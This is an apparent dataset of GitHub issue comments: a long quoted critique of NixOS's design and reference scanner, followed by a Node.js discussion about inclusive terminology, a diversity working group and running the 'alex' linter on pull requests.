> string). This hypothesis is strongly0 supported by the fact that of those,
> only 42 (or 0.03%) had different files sizes. None of these content
> differences have ever caused an observable difference in behavior.
> 
> How exactly does the reference scanner detect runtime dependencies? Regex
> and sed hackery? Or the correct way, parsing each language into its
> abstract syntax tree (ast), walking that and finding references to unix
> level dependencies (both static and dynamic)? I assume the former, as the
> latter is a great deal of work and would have been mentioned. Also, the
> only complete C99 parser (i.e., one that takes into account all the GCC
> extensions used in the linux kernel) I'm aware of is the haskell package
> Language.C.AST - and nix doesn't use haskell.
> 
> The problem with anything other than traversing a language's ast is that
> you're forever stuck with an approximation of the input language, resulting
> in false positives etc. This is not new information.
> 
> Much of the New Jersey approach is about getting away with less than is
> necessary to get the /complete/ job done. E.g., perl, is all about doing as
> little as possible that can approximate the full solution, sort of the
> entertainment industry's special effects and make-believe works, which for
> all practical purposes /is/ the real thing. Regular expressions is a pretty
> good approximation to actually parsing the implicit language of the input,
> too, but the rub with all these 90% solutions is that you have /no/ idea
> when they return the wrong value because the approximation destroys any
> ability to determine correctness. Most of the time, however, the error is
> large enough to cause a crash of some sort, but there is no way to do
> transactions, either, so a crash usually causes a debugging and rescue
> session to recover the state prior to the crash. This is deemed acceptable
> in the New Jersery approach. The reason they think this also /should/ be
> acceptable is that they believe that getting it exactly right is more
> expensive than fixing things after crashes. Therefore, the whole language
> must be optimized for getting the first approximations run fast.
> 
> -- http://www.xach.com/naggum/articles/3244575386963745@naggum.no.html
> 
> Notice that the paper says,
> 
> by storing packages in isolation from each other, we prevent undeclared
> build-time dependencies. In five years we haven't had a single instance of
> a package having an undeclared build-time dependency on another package /in
> the Nix store/, or having a runtime dependency in the Nix store not
> detected by the reference scanner.
> 
> but fails to mention how many people used NixOS over those 5 years, how
> many times undeclared build time dependencies /outside/ of the Nix store
> were encountered or how many packages were in the Nix store over this time
> period. Is this not relevant information? As Naggum stated above: ""the rub
> with these 90% solutions is that you have /no/ idea when they return the
> wrong value becuase the approximation destroys any ability to determine
> correctness."" If say, most of the NixOS users are NixOS developers (which
> they are) and the reference scanner doesn't walk the ast of the programs in
> question (which it doesn't), no reported failures means exactly nothing,
> because there will be many code paths not encountered by its users due to
> the sheer complexity of the software being interfaced with (e.g., how many
> NixOS +developers+ users use emacs docview? Not many apparently).
> 
> There are other issues with these papers I'm going to skip over, such as
> the clearing of environment variables (the proper thing to do imo is to
> gensym them to prevent unwanted interactions and study how they're being
> used - filter for 'functional' builds...), failure to discuss why a new
> project is needed in the first place (why can't you just perform this
> computation via an extension to an existing project?), total wtf issues
> with the papers (who are they written for? One who needs the concept of
> ""file system"" explained is going to have nfi what emacs lisp or
> ~/what/all/the/slashes/signify) etc.
> 
> The heart of the matter is that unix (ostensibly[0]) plays host to many
> different philosophies of how to go about programming. Languages differ in
> their approach to build systems, package management, syntax and foreign
> function interfaces. To change the way many software packages are built in
> a semi-automated, non-ast-walking fashion is insane. Not to discuss this in
> the design documents is insane. NixOS has 46 contributors and the
> documentation is sufficiently general as to give each contributor his own
> wildly different interpretation of the scope of the project. As far as I
> can tell, were one to extrapolate from the given information to a set of
> concrete requirements we see that NixOS plans to rewrite the build scripts
> for every version of every project on unix. Again, this is insane. The
> correct thing to do in this situation is to realize the utter impossibility
> of the task that has been set forth and re-evaluate one's approach.[1]
> 
> Let's examine the reference scanner. What is the correct way to approach
> the problem? We know regular expressions cannot respect the semantics of a
> language and thus are (unless used as a part of a larger parser)
> inappropriate for meta-programming (source-to-source transformations).
> Thus, we must work by manipulating the ast of various languages, and then
> pretty printing the altered code into the language's concrete syntax.
> 
> Most languages don't offer the ability to do this, and one examines into
> e.g., Clang, he will see all sorts of nonsense about concrete/surface
> syntax, context free grammars and compiler technologies. This certainly
> can't all be necessary (hint: it isn't).
> 
> Consider the following mathematical expression:
> 
> (3 + 2) \* 8 / 3 \* 3^6
> 
> Fully parenthesizing yields:
> 
> (((3 + 2) \* 8) / (3 \* 3^6))
> 
> When computers execute programs, or humans mathematics, the order of
> operations must be taken into account. one way to notate the previous
> expression to remove such ambiguities present in mathematical notation is
> to move operators to the front of each parenthesized list, passing the
> remaining elements as its arguments. This is known as fully-parenthesized
> prefix notation.
> 
> (/ (\* (+ 3 2) 8) (\* 3 (^ 3 6)))
> 
> This notational scheme has a direct mapping to the program's ast, which
> can be rendered as
> 
> http://i.imgur.com/8TO5VcK.png
> 
> See the pattern? An s-expression (fully parenthesized prefix notation) is
> merely a serialization for the ast. Thus, manipulations of the sexpr
> correspond to manipulations of the ast. Languages with the vocabulary to
> manipulate the s-expression structure can manipulate themselves (their ast)
> just as easily as any other thusly structured information. It follows from
> this that all software 'tooling' and translation tasks, transparently
> become trees e.g., find me all things that call this function, reference
> this variable, modify all build scripts to take into account the new
> &optional argument in the updated library, etc. are viewed quite
> transparently (and correctly) as tree traversals.[2]
> 
> For whatever reason, many find s-expressions distasteful and spend much of
> their lives attempting to add the same meta-programming facilities to ALGOL
> derived languages. They all have failed. Not because of any sort of
> mechanical failing of the computer, but the human's inability to fully
> comprehend the parsing and syntactical schemes they're able to create
> (Ruby's parser is 10k lines of C, Clang's is >100k loc. Note that the
> entirety of SBCL is ~300k loc, and has much fat that could be trimmed off -
> http://www.cliki.net/Lisp%20-%20Next%20Generation).
> 
> Scala is a notable failure in this regard. Watch this video:
> 
> http://www.youtube.com/watch?v=TS1lpKBMkgg
> 
> Pay attention to 37:39-42:50 and you'll get to see Paul Phillips flipping
> out over ir/asts (same thing!). He even states his plan for the next 25
> years - attempt to solve a problem solved 50+ years ago (
> http://c2.com/cgi/wiki?LispOnePointFive).
> 
> In particular, I found these quotes quite pertinent.
> 
> ""I want to programmatically generate asts and feed those""
> ""Even though this is what everybody does it's kinda nuts, why is the
> canonical code representation a STRING?!""
> 
> (not everyone does this, just algol derivatives)
> 
> ""The ast is going to be designed along side the VM""
> ""I need a tight feedback loop on the thing that I'm working on right now""
> 
> Wait, like every common lisp compiler ever? 30+ years behind the times yo.
> 
> ""the code that you look at, that ought to be a reflection of the AST. The
> canonical thing ought to be the tree, the code is a view of it.... It's
> trees that are fundamental, that's what we work with""
> 
> Lol. Gotcha.
> 
> ""something not offered by our tremendously entangled compiler, which
> doesn't even have a clean parse tree. It's comical. Try to get back to the
> source from what you get out of the scala parser. To me, the minimum test
> of a parser is that it parses!""
> 
> Lol. 'Comical' is definitely the right word.
> 
> ""modifiability is paramount. If it isn't straightforward to modify, it
> will never be any good. It will never be fast. It will never be correct.
> And it will eventually be replaced by something modifiable... after
> consuming as many hours as you feed it.""
> 
> Again, 30+ yrs behind the times[3]:
> http://article.gmane.org/gmane.comp.java.clojure.user/34272
> 
> So what does all this have to do with NixOS?
> 
> Much of the complexity in NixOS originates in the failure to address why
> it isn't a trivial modification on an existing project. Were they to have
> honestly sized up the problem they'd end up at something like: people suck
> at both reading & programming, also asts are fundamental. They'd then
> realize that at some point you have to choose some languages and leave
> others, because not everyone has something to offer and writing fully
> compliant parsers for all the languages involved is about as entertaining
> as building pyramids. When one has decided on a particular scheme, one
> could set about implementing ""the ability to save and restore parts of
> unix's dependency graph"".
> 
> But by failing to address this complexity NixOS inherits it, and in
> practice, adds to it by the 'invention' of /yet another/ language created
> for no particular reason. 800+ existing languages[4] and /none of them/
> have the required properties? Nonsense. Allow me to anticipate your retorts:
> 
> ""I need to know that my nix code is functional""
> 
> ``common lisp
> 
> ;; let's assume, for the sake of argument that you only want the symbols
> 
> ;;functional-lol', design-antipattern',the-type-gods-will-save-me' plus
> 
> ;; strings to occur in your 'language' in addition to strings and
> keywords. You
> ;; know that the functions these symbols describe are functional and thus,
> a
> ;; valid program is functional.
> ;;
> ;; here is how you validate a 'nix' ast.
> 
> (defun flatten (tree)
> ""Traverses the tree in order, collecting non-null leaves into a list.""
> (let (list)
> (labels ((traverse (subtree)
> (when subtree
> (if (consp subtree)
> (progn
> (traverse (car subtree))
> (traverse (cdr subtree)))
> (push subtree list)))))
> (traverse tree))
> (nreverse list)))
> 
> (defvar myast '(functional-lol (design-antipattern ""death"")
> (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies"")))
> 
> (defun validate (ast)
> (every (lambda (k) (or (keywordp k) (and (symbolp k)
> (member k '(functional-lol design-antipattern the-type-gods-will-save-me)
> :test 'eq))
> (stringp k)))
> (flatten ast)))
> 
> (validate myast) ; => nil
> 
> ""I don't want to require a whole compiler!""
> 
> By failing to make use of existing programs NixOS not only adds a language (compiler/interpreter), but the requirement for an Emacs mode (+1 more for every other editor!), custom syntax highlighting, extra crap for auto-completion etc. etc. One should instead make use of what already exists. As it stands SLOCCOUNT reports 26.3k loc, divided across 7 languages being are used to introduce another for the nix project. This number of languages alone is enough to guarantee that no one will ever understand the whole codebase on a rolling basis and have enough time to do much else with their life.
> 
> A preceptable analogy to the natural languages springs forth: if we created them for the same reason so-called professional programmers create programming languages, each new subculture would require a whole new alphabet/glyph scheme, phonetic system, grammatical structures etc. Though some surface features may be shared across languages, the underlying semantics they represent would change in unpredictable and often incompatible ways.[5]
> 
> ""So, you want us to write lisp? What if something better comes along?""
> 
> You are faced with a choice - either learn from those who came before you, or spend the rest of your life fighting monstrosities of your own creation, attempting to eke out some order in all the chaos, be it the SDF/BNF format of a language's syntax or otherwise. In any case, if something better comes along, transforming your s-expression code into <powerful new notation> will be a straightforwards intern-level task[6].
> 
> Now to address some unanswered questions.
> 
> > If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away.
> 
> You don't say.
> 
> > I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @gabriel-laddel .
> 
> You're in Mexico city and ask a bystander to direct you to the airport (your phone died, you lack a map and you're going to miss your plane unless you make it to the airport soon). He gives very specific instructions, which you write down and follow exactly. You reach the last instruction somewhere near the slums, missing your flight. As such, you swear loudly.
> 
> Is anyone entitled to correct directions? Of course not. I however, expect the /bare minimum/ of people giving correct directions and accurate descriptions of their projects, much like I expect my friends to brush their teeth regularly.
> 
> > There's an SDF representation of the syntax in @edolstra's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly.
> 
> If I say ""jump in front of the bus on my mark, ready? 1, 2, 3 - JUMP!"" it is clear what I'm asking/ordering, what is less clear is why I'd be asking/ordering someone to jump in front of a bus.
> 
> > :-) reminds me of classical Cathedral vs. Bazaar dilemma.
> 
> There are very few classics in the field of computing. We are at the very beginning of this journey and it hasn't even begun to get interesting yet. IMHO, the Cathedral vs. Bazaar isn't in anyway a dilemma or a classic. Linux was a failure 20 years ago, it is a failure today and any posturing otherwise is just that. See The UNIX-HATERS Handbook[0] for more information.
> 
> I find the contrast between these quotes accurately depicts the computing situation circa 2015.
> 
> > The process of constructing instruction tables should be very fascinating. There need be no real danger of it ever becoming a drudge, for any processes that are quite mechanical may be turned over to the machine itself.
> > 
> > -- Turing, A. M., 1946, Proposed electronic calculator, report for National Physical Laboratory, Teddington
> > 
> > for the present-day darkness in the programmer's world the programmers themselves are responsible and nobody else.
> > 
> > -- Dijkstra
> - Footnotes
> 
> [0] In actuality unix is mostly a pile of stupid, see: web.mit.edu/~simsong/www/ugh.pdf
> 
> [1]
> 
> > Suppose you're trying to find the best way to structure your description of something.  (Examples:  choosing the structure for a computer program to perform some task; or choosing the structure for a theory of physics.)
> > 
> > What you hope to find is the natural structure of what you're describing — a structure that affords a really beautiful, simple description.  When you strike the natural structure, a sort of resonance occurs, in which various subsidiary problems you may have had with your description just melt away, and the description practically writes itself.
> > 
> > But here's a problem that often occurs:  You've got a structure that affords a pleasing approximate description.  But as you try to tweak the description for greater precision, instead of the description getting simpler, as it should if you were really fine-tuning near the natural structure, instead the description gets more and more complicated.  What has happened, I suggest, is that you've got a local optimum in solution space, instead of the global optimum of the natural structure:  small changes in the structure won't work as well as the earlier approximation, and may not work at all, so fundamental improvement would require a large change to the structure.
> > 
> > -- http://fexpr.blogspot.com/2012/12/metaclassical-physics.html
> 
> [2] This scheme the surrounding ideas are so fundamental that they've sometime's referred to as ""Maxwell's equations of Software"". You can read more about Lisp and s-expressions elsewhere so I'll not repeat it here.
> http://www.defmacro.org/ramblings/lisp.htmlhttp://www.michaelnielsen.org/ddi/lisp-as-the-maxwells-equations-of-software/http://norvig.com/lispy.htmlhttp://norvig.com/lispy2.html
> 
> [3] This information re, Scala is interesting beyond the technicalities. Typesafe, the Scala company (has Martin Odersky as Chairman and Chief Scientist) has received 31 MM in funding. Coursera (who built everything in Scala) has received 85MM. I'll predict they'll eventually fail as they're out-competed by more intelligent adversaries, though both will (due the amount of funding and high-profile people involved, probably limp along for years to come).
> 
> Last I checked, Coursera already had fungus growing on it: something about, ""usg-sponsored studies find that coursera is better than starving in Africa""
> 
> [4] http://en.wikipedia.org/wiki/List_of_programming_languages
> 
> [5]
> 
> The corresponding lisp narrative feels 'organic'. Consider the SBCL (steel bank common lisp) compiler. It is descended from CMUCL python compiler and uses some of its code, changing it as circumstances require (and of course, any transformations that needed automation were but a tree traversal away). Naggum also had some related thoughts:
> 
> > There is a simple and elegant answer to this question: Just learn Common
> > Lisp well first.  New languages are exciting to people who know mostly
> > new languages, so learn an old language before you learn new ones and get
> > out of the maelstrom that will drown you in ever new languages that add
> > nothing at all except some miniscule additional feature from another
> > language that someone needed to make a whole new language to implement
> > because he did not know (Common) Lisp to begin with.  A ""new"" language
> > that differs from the rest of the crop by one or a couple features is
> > proof positive that both what it came from and what it has become are
> > mutations about to die.  There are tens if not hundreds of thousands of
> > such ""languages"" that people have invented over the yeare, for all sorts
> > of weird purposes where they just could not use whatever language they
> > were already using, could not extend it, and could not fathom how to
> > modify its tools without making a whole new language.  They never stopped
> > to think about how horribly wasteful this is, they just went on to create
> > yet another language called Dodo, the Titanic, Edsel, Kyoto-agreement...
> > 
> > -- Erik Naggum, http://www.xach.com/naggum/articles/3206985430398054@naggum.net.html
> 
> [6] This could be largely automated, but that is a discussion for another day.
> 
> —
> 
> Reply to this email directly or view it on GitHub
> https://github.com/NixOS/nixpkgs/issues/4952#issuecomment-73422170.
"
4058	">  I understand that you fully wanted to underline your points but I would have been happy with
> - you didn't take existing source package management like CPAN into account 10 years ago
> - you just scan for strings in the build output so you can not be 100% sure that the dependency graph is correct 
> - you invented Nix instead of using something like LISP

Uh... yeah, that's totally all the points I made.

Toodles.
"
4059	"NB: I'm a Lisp guy who uses and likes NixOS, but isn't a big expert in NixOS.

Minor remarks: uiop:run-program has a now reliably portable :directory clause.
If you only care about Unix, then you can use ; to separate commands in a single string.
(If you want to support windows, & might work, but not all implementations can successfully use CMD.EXE on Windows, and /bin/sh isn't reliably present.)

NixOS isn't perfect, but is accepting patches.

If you're interested in static linking of libfixposix into sbcl images, I have recipes that need to be put together into actual code, that you may be interested in. If you want a NixOS package with dynamic linking the solution is to either enhance cffi so you can statically specify the search path, or have a wrapper that initializes the search environment around the binary.

Also, the solution to false negatives is that a package breaks if it's missing a dependency, so whoever is writing the package specification will notice and fix it — and thereafter it will build deterministically.
"
4060	"Thanks for the info Francois. FTR, NixOS is fundamentally braindamaged. I found it was easier to create my own distribution than to hack around their crud. Details here:

http://gabriel-laddel.github.io/system.html
http://gabriel-laddel.github.io/arsttep.html

On Fri, Jul 10, 2015 at 4:11 PM, François-René Rideau <
notifications@github.com> wrote:

> NB: I'm a Lisp guy who uses and likes NixOS, but isn't a big expert in
> NixOS.
> 
> Minor remarks: uiop:run-program has a now reliably portable :directory
> clause.
> If you only care about Unix, then you can use ; to separate commands in a
> single string.
> (If you want to support windows, & might work, but not all implementations
> can successfully use CMD.EXE on Windows, and /bin/sh isn't reliably
> present.)
> 
> NixOS isn't perfect, but is accepting patches.
> 
> If you're interested in static linking of libfixposix into sbcl images, I
> have recipes that need to be put together into actual code, that you may be
> interested in. If you want a NixOS package with dynamic linking the
> solution is to either enhance cffi so you can statically specify the search
> path, or have a wrapper that initializes the search environment around the
> binary.
> 
> Also, the solution to false negatives is that a package breaks if it's
> missing a dependency, so whoever is writing the package specification will
> notice and fix it — and thereafter it will build deterministically.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/NixOS/nixpkgs/issues/4952#issuecomment-120447628.
"
4061	"@gabriel-laddel :open_mouth:
"
4062	"While this is certainly a historical problem I wonder if it is a current one. We have roughly 10x the number of active code reviewers we had when most of the current API was defined and they are from an incredibly broad set of language backgrounds.
"
4063	"I think the most effective way to do handle this is to have a LGTM from @nodejs/diversity on release PRs.
"
4064	"@mikeal the review takes two persons, so the commit may land without broad attention.
"
4065	"@indutny while that's a good idea, the active level of engagement from this WG has not to date been enough to effectively review weekly releases. Also, we should be catching these in code review rather than release since we can now land semver-major code long before it is ever released.
"
4066	"@mikeal I totally agree with you that catching it early is ideal case. However LGTMs on releases from the diversity WG should be a very good start. We can always cancel release, or change the version number if there are any serious problems.
"
4067	"hi! i am interested in volunteering time/effort/labor to improving this. how can i help? would be very happy to do review. i know there is a diversity WG. i hear it might need some more diversity on it...
"
4068	"@mikeal I think there's a good reason to have @nodejs/diversity be kind of the failsafe for releases, though catching them in code review would be ideal. I'd be willing to chip in for those reviews as well.
"
4069	"@thealphanerd asked me to post this here: https://github.com/wooorm/alex

This is a tool for linting English for sensitive terms- they have a fairly comprehensive list of checks and theirs issues threads always have good conversations and insights.
"
4070	"@therebelrobot that might sound good but the reality of the release process makes this kind of process a poor fit. we've actually optimized the development process to take care of all of these kinds of guarantees so that releases can be produced with little to no additional process.

however, we could explicitely document these guidelines in the contribution policy and note that the process for flagging something problematic would be to @ the diversity wg?
"
4071	"It might also be good to train existing collaborators on terminology sensitivity, so we're aware of what sorts of terms may be offensive to some people. Not all collaborators speak English natively, and may not understand the importance of particular uses of words.
"
4072	"> we've actually optimized the development process to take care of all of these kinds of guarantees so that releases can be produced with little to no additional process.

Fair. +1 to adding to the contribution guidelines.
"
4073	"@jden wow, that's cool :) As long as we have a way to only send new diffs through it as we're sure to trip it up on all the underlying terminology we essentially proxy.
"
4074	"There are NLP related linting tools that can be used for problematic language... although I doubt we are going to want to fix the current problems (such as the words master, host, etc...)

What can help is on boarding more people into collaborators who have an active passion to see this kind of stuff be better.

Right now I'm following every issue / PR via email... it may be quite a bit of work, but with enough eyeballs ....

edit: missed jden's response above... but we totally could write a CI tool based on this
"
4075	"@Qard so, I think it's a good idea to stay away from putting this kind of barrier to entry on contributions. As @isaacs noted quite well, you can tell the difference between deliberate and non-deliberate violations and as long as we have a strong enough review process to correct this it's better than adding barriers to non-native-english speakers prior to their contributing.
"
4076	"busting in here, again. let's get some diversity in the reviewers, i think that's gonna help a lot.

empower the people who care. it'll go a _long_ way.
"
4077	"> There are NLP related linting tools that can be used for problematic language... although I doubt we are going to want to fix the current problems (such as the words master, host, etc...)

Remember that the Node.js project is much more than core, we could adopt these linting tools on the website with little to no existing issues (the API docs are in a different repo).
"
4078	"@ashleygwilliams invite sent for the diversity WG, let me know if you got it.
"
4079	"@nebrius yup!! thxx
"
4080	"@nebrius, I'd love to assist with the diversity team as well, if there's still room.
"
4081	"Quick note for whoever ends up tackling this documentation.

We need to get a lot better about making the project accessible to non-native english speakers. Using words that are english metaphors for behavior does not help. Using unnecessary big words in documentation also does not help. Ideally we could produce a set of guidelines that are easily understood and also easily translatable.
"
4082	"I'd encourage anyone expressing interest in the Diversity WG more broadly to also look at https://github.com/nodejs/diversity/pull/7 and comment.
"
4083	"Before attempting to put too much policy into place, let's be sure to at least take a look at whether it's actually that wide spread of a problem. In the cases where certain questionable terms (like `suicide`) appear, there may not be a good technical argument to make for changing the terms but there's also no good reason _not_ to change them. So long as we follow our existing processes for reviewing commits and resolving conflicts, the overwhelming majority of issues can be caught.
"
4084	"@nebrius ... hmmm. Truthfully, we can never have too many people who want to help with diversity issues. Your comment is not really how participation and membership in these working groups is supposed to be determined. You're absolutely right that we need broad, diverse and inclusive participation -- particularly from individuals who would be the most impacted and benefiting from an increased focus on diversity -- but your comment comes off quite counter to that goal. 
"
4085	"I'd add that this WG doesn't actually exist yet, technically. So, currently, no one is a member, truthfully. Per [the website](https://nodejs.org/en/about/working-groups/#starting-a-wg):

> A Working Group is established by first defining a charter that can be ratified by the TC. A charter is a statement of purpose, a list of responsibilities and a list of initial membership.

We don't have that yet. Go over to #7 and make this group happen!
"
4086	"> I'd add that this WG doesn't actually exist yet

""doesn't exist"" is a little harsh :) The working group process assumes that a working group first runs in an ""un-chartered"" state while it figures out its processes and how it's getting things done.
"
4087	"@mikeal True and an important correction/clarification to what I wrote. Thanks for that.
"
4088	"@jasnell the process the WG is using is still being refined and has some limitations other WGs don't have as some of the issues they tackle are magnets for internet trolls. However, there's issue #8 which I think addresses some of your concerns.
"
4089	"@mikeal :+1: so long as there's not a process for explicitly determining who _shouldn't_ be involved, I'm good with #8. The truth of the matter is, ""cis white guys from SF"" is as much an unwelcome stereotype as anything else, and as @therebelrobot rightfully points out, perspective can come from anywhere. Let's keep the conversation heading in the right direction
"
4090	"I like this document

--> http://juliepagano.com/blog/2014/02/26/bad-ally-quiz/

Perhaps the WG should have to pass the quiz
"
4091	"@TheAlphaNerd but since that's just an online quiz, can't everyone theoretically 'pass' it? it's easy to cheat on those things :/
"
4092	"@sup did you read the article?
"
4093	"@TheAlphaNerd the article before the quiz? I believe so, am I missing something really obvious here? :fearful: 
"
4094	"cc/ @wooorm this might be relevant given the work you've done on Alex. Perhaps you have any thoughts on the matter?
"
4095	"As if summoned by linking to my post, let me know if it would be helpful for me to participate in the WG. Would be happy to help out especially since I'm using node a bunch these days. :)
"
4096	"+100 to inviting @juliepagano on board officially :+1:
"
4097	"> As if summoned by linking to my post, let me know if it would be helpful for me to participate in the WG.

Yes please :shipit:
"
4098	"@juliepagano your internet wizard skills are on point
"
4099	"@juliepagano what's you're email address?
"
4100	"@nebrius julie.pagano at gmail
"
4101	"invite sent, let me know if you didn't get it
"
4102	"Thanks for the pings, @yoshuawuyts and @jden! I’ll promote alex a bit (hope you don’t mind)

I never intended [alex](https://github.com/wooorm/alex) to be used in CIs. It highlights a lot (by design), and humans smarter than it should choose whether its too sensitive or whether it highlights valid points.

However, I like the diff-only approach someone mentioned above, that might actually work. For example, in the below flow:
- A CI would pass the additions of a PR through alex;
- alex finds stuff in the additions, and fails that CI task;
- A member of `nodejs/diversity` checks it out and merges it anyway (because alex is overly sensitive) or halts the PR.

The good part about this is that this flow has some part automation (removing human ego), and some part human (removing dumb automation).

Thoughts?
"
4103	"@wooorm: That actually sounds like a decent idea, and totally doable as well. +1
"
4104	"@wooorm that sounds like a pretty good workflow.
"
4105	"I spend most of my time on code reviews in the main repo. So I guess I also can contribute to the workflow which we define here.
"
4106	"> Are there any processes that can be put in place to avoid situations where a word choice can be problematic/distracting/triggering/offensive to users?

You are wasting your time because any word can be ""problematic/distracting/triggering/offensive"" to someone. Let me ask you, have any of you actually been oppressed and driven to the point where every moment of your life was disgusting you? Because if you had you would not be thinking you can be some white knight for people.

Here is the fact: words have no power, they are just words. People who are stressed out by mere words are either a) unter too much to perform any serious work or b) attention grabbing spoiled brats who made up a problem. I have been in position a) and it doesn't matter how much you change the wording, you would not have gotten anything useful out of me either way.

Do you want to know what is really problematic in this issue? Privileged people who think they know better than everyone else and what to play moral arbiter. Anyone who has been down is better than this, we know that words cannot hurt us and we do not want you to speak for us. The idea that you somehow have to protect us because we are so weak that words will destroy us is purely disgusting.

---

A word should be chose so that it conveys its meaning as precisely and simply as possible. Take for instance `kill`: killing a process means forcefully ending it immediately. Even my mother could understand that. Replacing `kill` with `stop` would cause confusion: is it stopped immediately? Is it told to stop at the next opportunity? Does it have to honor the request? None of this is clear from the term. See how much confusion you have added in your righteous quest to?

Words need to be evaluated individually. If someone were to troll by adding a `rape` command that should not be tolerated. Not because it's a ""problematic"" word, but because raping a process does not convey any meaning.
"
4107	"> any word can be ""problematic/distracting/triggering/offensive"" to someone.

This simply is not true, and is the basis of your entire argument so I'm going to ignore the rest. There is a very small subset of words in any language that are offensive to some people. Those may be more words than are offensive to _you_ but that doesn't really matter because removing words that are offensive to other people will not effect you as a user of this software.

It is not productive to tell people not to be offended by something they find offensive. The way to include them is to remove the things, when possible, that offend them as doing so only increases the number of people who can enjoy using the software.
"
4108	"👍👍 @mikeal. the conversation here is not to debate whether this is a problem, but rather already accepts that it is and seeks out solutions. 
"
4109	"> This simply is not true, and is the basis of your entire argument so I'm going to ignore the rest.

Let me show you how it reads:

> Shut up non-American minority, I as a white American know better what's good for you.

I'm going to ignore the rest because you clearly don't care about people with actual lived experiences.
"
4110	"p.s. ""even my mother could understand that"" is not cool. it perpetuates the idea that moms are dumb and bad at computers. 

however, moms are cool and smart. dont be rude.
"
4111	"@HiPhish I'm advocating that language people find offensive be removed. That is not every word on earth, and you know this. I'm also _not_ suggesting that I am the person to provide that list, and if you based on your own lived experiences have words or statements that you find offensive in the software they can also be removed. _That_ is what is being suggested. 

However, the argument that removing words that are offensive to a group of people is somehow an attack on those who don't find it offensive is an absurd argument. We're not suggesting that people who unknowingly include problematic words be attacked in some way or driven out of the project, we'll simply correct those words in the review process as we would any other style issue. You claimed that people ""choose to be offended"" by words, regardless of their lived experience, while at the same time you yourself are choosing to be offended by the removal of these words which have no deep meaning to you.
"
4112	"@HiPhish can u elaborate on the experiences of being a non white non american that u think are relevant here? we do care about that perspective.

what @mikeal is referring to is that u made an appeal to an argument that is common in these spaces and is not constructive. specifically, the idea that any word can be offensive to anyone. we, and many others, have not found this to be the case.

you might be afraid that changing some words means we might end up changing all words and muddying up the API. that's a valid concern, but is highly
unlikely. instead, it is bery likely to improve the inclusivity of our community, thus improving diversity and all the great things that come with that.
"
4113	"@HiPhish ... please consider this a first warning. @mikeal's comments were quite clearly directed at your argument and could not be reasonably interpreted in the manner you suggest. Further comments of this nature will be interpreted as ""trolling"" and you will be blocked. You are obviously welcome to your own opinions, and there's no expectation that everyone should agree, but please keep your comments constructive and on topic.
"
4114	"@ashleygwilliams _My_ mother is computer illiterate and bad at computers. I never implied that she was dumb. Being computer illiterate doesn't make you dumb, just as not knowing the intricacies of plumbing does not make you dumb.

> instead, it is bery likely to improve the inclusivity of our community, thus improving diversity and all the great things that come with that.

What does that mean? People who are under stress cannot code, because they cannot think rationally. That's simply a consequence of being under stress. And people under stress are the only ones affected by just words. Therefore the entire discussion is based on a false premise.
"
4115	"> And people under stress are the only ones affected by just words.

i wouldn't _just_ limit it to only that. i know a few people that are very emotional and can get hurt by using the wrong choice of words against them, even if they're not under stress
"
4116	"@hiphish i think we need to end this convo because i am now very confused also i am on an airplane that is taking off.

that being said im stressed often but still code well. i dont understnad your point.
"
4117	"@HiPhish umn no, you don't get to use the phrase ""Even my mother could understand that"" and then claim that you were not making reference as to ""mother"" being ""dumber"" than the subject. That was the entire point of the phrase.

Your insistence on turning this into a narrative in which you are the victim is disturbing and quite distracting from any substantive comments you might be trying to make.
"
4118	"i gotta agree with @ashleygwilliams that we should end this convo because i see typing mistakes popping up everywhere (& that's never a good sign), and i can't really follow the discussion anymore
"
4119	"Back to https://github.com/nodejs/inclusivity/issues/9#issuecomment-155759123

(CI for this idea-ish)

I think this would be best implemented as a separate CI that automatically runs on PRs and delivers a GitHub status. I think we could work with that kind of thing.

Integrating it into regular CI runs unfortunately isn't so nice since we already get a lot of failures for various (mostly hardware and jenkins) reasons and it's already hard to sort though those.

(Also: full CI runs have to be activated by a collaborator due to certain security concerns regarding the build machines and code run on them. This task would not have that issue.)
"
4120	"@Fishrock123 .. before we get too far down the road of automating it, can we do a one time manual pass over the existing code to see if there are any existing issues that ought to be looked at first?
"
4121	"@ashleygwilliams I don't mean stressed as in ""I have an appointment in five minutes, I still have three months of bills to pay"" kind of stressed, I mean an actual stress state. You know where people's flight-or-fight instinct has been triggered.

@mikeal I am not trying to paint myself as a victim. I had been through tough shit in my life, I have been through good things in my life. The point I am making is that people do not need to be shielded for what an arbiter decides to be ""triggering"" content. Coping with what happened to you is the first step to getting better, and yes, that includes being abled to get exposed to words and images. It takes time, but people who have been under actual shock are in no condition to contribute to a software project anyway.

Shielding yourself from words is doing yourself a disservice and such a practice must not be encouraged. Even if you mean well you are actually harming people more that way. To make a blunt analogy, imaging if someone fell down the stairs and got hurt really bad. Would you keep that person away from stairs or help them get used to stairs again?
"
4122	"@jasnell I never suggested that we wouldn't. This is discussing ways they we might be able to extend something into the future.
"
4123	"> I am not trying to paint myself as a victim. I had been through tough shit in my life, I have been through good things in my life. The point I am making is that people do not need to be shielded for what an arbiter decides to be ""triggering"" content. Coping with what happened to you is the first step to getting better, and yes, that includes being abled to get exposed to words and images. It takes time, but people who have been under actual shock are in no condition to contribute to a software project anyway.
> Shielding yourself from words is doing yourself a disservice and such a practice must not be encouraged. Even if you mean well you are actually harming people more that way. To make a blunt analogy, imaging if someone fell down the stairs and got hurt really bad. Would you keep that person away from stairs or help them get used to stairs again?

As a software project we don't have the ability to change how certain words effect individual people and thus exclude them from our project. What you may believe is the best way for them to deal with their feelings is moot, whether we agree or not, because we simply don't have the ability to change people on that level. As such the only way we can include them is to remove the language, which in many cases is quite simple.

You can disagree with that approach but doing so means that you're valuing your prescription for how they should deal with these issues over including them in the project.
"
4124	"@jasnell / @Fishrock123 I have done a pass at lib/ and here are some of the highlights... I am avoiding categorizing or ranking but I am removing false positives
- host (used through code base in many files)
  - `host` may be insensitive, use `presenter`, `entertainer` instead

**_http_client**
- crazy (used in a comment in )
  - `crazy` may be insensitive, use `rude`, `mean`, `disgusting`, `vile`, `person with symptoms of mental illness`, `person with mental illness`, `person with symptoms of a mental disorder`, `person with a mental disorder` instead

*\* domain **
- stupid (used in comment)
  - `stupid` may be insensitive, use `foolish`, `ludicrous`, `unintelligent` instead
- insanity (used in comment)
